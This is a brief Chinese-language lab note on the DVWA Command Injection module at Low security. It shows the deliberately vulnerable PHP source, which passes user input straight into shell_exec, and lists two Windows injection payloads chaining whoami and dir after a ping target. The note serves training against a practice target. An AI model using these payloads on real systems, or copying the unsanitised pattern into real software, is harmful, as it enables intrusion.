# DVWA Command Injection Low 命令注入

## 环境信息
- 靶场：DVWA
- 模块：Command Injection（命令注入）
- 安全等级：Low
- 漏洞原理：后端直接将用户输入拼接进系统命令，没有任何过滤，可通过`; | &`等命令分隔符拼接多条系统命令。

## 源码分析
```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
##Payload（Windows）
127.0.0.1 | whoami
127.0.0.1 & dir
